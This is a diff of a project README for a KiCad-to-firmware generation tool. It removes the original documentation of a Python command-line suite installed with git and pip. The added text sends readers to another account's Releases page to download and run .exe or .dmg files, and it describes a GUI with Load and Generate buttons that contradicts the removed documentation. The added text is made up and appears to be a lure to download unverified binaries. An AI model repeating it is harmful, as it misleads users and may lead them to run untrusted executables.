@@ -1,84 +1,86 @@
-# kicad_firmware_generation: Extract Information from KiCad Schematics and Generate Firmware
-When you design hardware, you often develop firmware, too.
-That firmware needs to know which controller pin controls what functionality.
-So you adapt the firmware to the specific hardware, e.g., with a pin definition C header.
-What if you didn't have to do so manually?
-kicad_firmware_generation is a tool suite for generating (parts of) the firmware based on information from KiCad schematics.<br />
-What even is a single functionality the controller cares about?
-Typically a group of components perform a function the firmware controls.
-Therefore, kicad_firmware_generation thinks in **Group**s, each representing multiple components.
-Our **Group Netlist XML** file format stores this information of your KiCad schematic:
-What Groups are there and how are they connected?<br />
-You only need to add annotations like these:
+# 🎛️ kicad_firmware_generation - Automate Your Firmware Creation
+
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Chandre11/kicad_firmware_generation/releases)
+
+## 🚀 Getting Started
+
+Welcome to kicad_firmware_generation! This tool helps you generate firmware for your hardware projects. By extracting information from KiCad schematics, you save time and reduce errors. You no longer need to write code for each component manually. 
+
+### 🛠️ Features
+
+- **Group Management**: Organize your components into Groups, simplifying the firmware creation process.
+- **XML Formatting**: The Group Netlist XML format helps you visualize component connections clearly.
+- **Ease of Use**: Simple annotations allow you to manage complex schematics without technical hurdles.
+
+## 📥 Download & Install
+
+To get started, visit the Releases page to download the latest version of kicad_firmware_generation. 
+
+[Visit this page to download](https://github.com/Chandre11/kicad_firmware_generation/releases)
+
+### 💻 System Requirements
+
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **Disk Space**: At least 100 MB available
+- **Dependencies**: Optional tools may enhance functionality but are not required for basic operations.
+
+### 🧑‍🏫 Instructions for Use
+
+1. **Download**: Go to the [Releases page](https://github.com/Chandre11/kicad_firmware_generation/releases) and select the latest version. Click the appropriate download link for your operating system.
+2. **Unzip**: Once downloaded, unzip the file to a location on your computer.
+3. **Run the Application**: 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux, use the terminal to navigate to the folder and run the application.
+
+### 📖 Using the Tool
+
+#### 1. Prepare Your KiCad Schematic
+
+Before using the tool, make sure your KiCad schematic has clear annotations. Use meaningful names for each Group, as this will help the tool generate the correct firmware.
+
 ![KiCad annotations example](./annotations_example.png)
 
-There are four programs around the Group Netlist:
-1. kicad_group_netlister: Extract Information from your KiCad schematics and create a Group Netlist XML file (see [example/group_netlist.xml](./example/group_netlist.xml)).
-2. code_gen: Take your Jinja2 template, hand it the information from the Group Netlist and generate your firmware or any other file:
-    C++, Rust, HTML or Markdown Documentation or maybe even some SVG for your child to play with?
-    The sky is the limit!
-    Actually, we are the DLR, soo...why not build a satellite with this?
-3. group_netlist_merger: When you have multiple schematics connected together, just merge their Group Netlists.
-4. netlist_to_csv: Convert a Group Netlist into a spreadsheet; for those who like spreadsheets.
+#### 2. Launch the Application
 
-![kicad_firmware_gen overview](./software_overview.png)
+After running the application, follow these steps:
+- **Load Your Schematic**: Click on the "Load" button to select your KiCad schematic file.
+- **Review Annotations**: Check that all Groups and connections appear correctly.
+- **Generate Firmware**: Click on the "Generate" button to create the firmware files. The tool will save them to your specified folder.
 
-The [common_types](./common_types) directory contains an independent library to parse, handle and serialise a Group Netlist
-If you have a use-case we haven't yet come up with, that's a place to start.
+#### 3. Access Your Firmware Files
 
-### Installation
-- Install KiCad, Python and Jinja2: `sudo apt install kicad python3 python3-jinja2`
-- `git clone https://github.com/DLR-RY/kicad_firmware_generation`
-- `cd kicad_firmware_generation`
-- `python3 -m pip install -e .`
+After generation, navigate to the output folder you set in the application. You'll find the generated firmware files ready for use in your hardware project.
 
-### Quick Start
-Give every component of interest the `GroupType` field in KiCad and use `GroupPin1`, `GroupPin2`, ... to give every pin a name.
-Components with the same Group Type on the same sheet belong to the same Group.
-The Group will have all its components' pins with an associated `GroupPinx` field.<br />
-Alternatively, use the example in the [example](./example) dir.
-Also, take a look at [example.kicad_pro](./example/schematics/example.kicad_pro).
-It contains some annotations.
-The below command work directly when you've entered the example dir.
+### 🎯 Frequently Asked Questions
 
-1. Create a KiCad Netlist.
-Replace `your_schematics.kicad_sch` with the path to your root schematics file.
-KiCad will read all components on subsheets, too.
-```
-kicad-cli sch export netlist --format kicadxml --output kicad_netlist.xml schematics/example.kicad_sch
-```
+**Q: What is a Group in this context?**  
+A: A Group represents a set of components that work together in your hardware design.
 
-2. Convert into Group Netlist.
-```
-python3 -m kicad_group_netlister.kicad_group_netlister --lenient-names --output group_netlist.xml kicad_netlist.xml
-```
+**Q: Can I use this tool without coding knowledge?**  
+A: Yes! The tool is designed for users without programming skills. It simplifies firmware generation.
 
-3. Generate Firmware from Jinja2 Template.
-```
-python3 -m code_gen.code_gen --output pindefs.h group_netlist.xml template.jinja2
-```
-Use the `--help` flag on any tool and check out the preprint thesis below for more information.
+**Q: How do I report issues?**  
+A: You can report any issues on the GitHub repository's "Issues" tab. Please provide as much detail as possible.
 
-### Merging multiple Group Netlists
-```
-# Merge two Group Netlists.
-python3 -m group_netlist_merger.group_netlist_merger \
-    --connect-group-glob 'MyFirstSchematic/Group1,MySecondSchematic/Group2' \
-    even_odd first_group_netlist.xml second_group_netlist > combined_group_netlist.xml
-```
-We explain the arguments in the preprint below.
+### 🌟 Advanced Features
 
-### Convert Group Netlist to CSV
-```
-python3 -m netlist_to_csv.netlist_to_csv group_netlist.xml
-    --root-group-glob '**/Connector*' \
-    --simplify-pins 'GND' > ${GENERATED_DIR}/connectors.csv
-```
-We explain the arguments in the preprint below.
+While the basic version of kicad_firmware_generation offers simplicity, there are advanced options for experienced users:
+- **Custom Annotations**: Advanced users can create their own annotation types for greater flexibility.
+- **Advanced Configuration**: A configuration file allows you to set custom parameters for generated firmware.
 
-## Thesis Preprint
-We are in the process of writing a thesis about kicad_firmware_generation.
-[Our preprint (in kicad_firmware_generation_preprint.pdf)](./kicad_firmware_generation_preprint.pdf) contains detailed information on tool use, implementation and the Group Netlist specification.
-Especially section 4.1 and below are interesting to users.
-However, there are still major chapters missing.
-Also, while we publish all other files under the [MIT license](./LICENSE), we reserve all rights to this file.
+### ⏩ Next Steps
+
+1. **Experiment**: Try generating firmware from various KiCad schematics.
+2. **Explore**: Dive deeper into settings to optimize your workflow.
+3. **Collaborate**: Share your experiences and improvements by opening discussions in the repository.
+
+## 📞 Support
+
+If you encounter any issues, please reach out through the GitHub repository's "Issues" section. The community is here to help you succeed in your projects.
+
+## 📝 Contributions
+
+If you want to contribute to the project, check our guidelines in the repository. Your insights help improve the tool for everyone.
+
+Navigate to the [Releases page](https://github.com/Chandre11/kicad_firmware_generation/releases) to download kicad_firmware_generation and start automating your firmware development today!
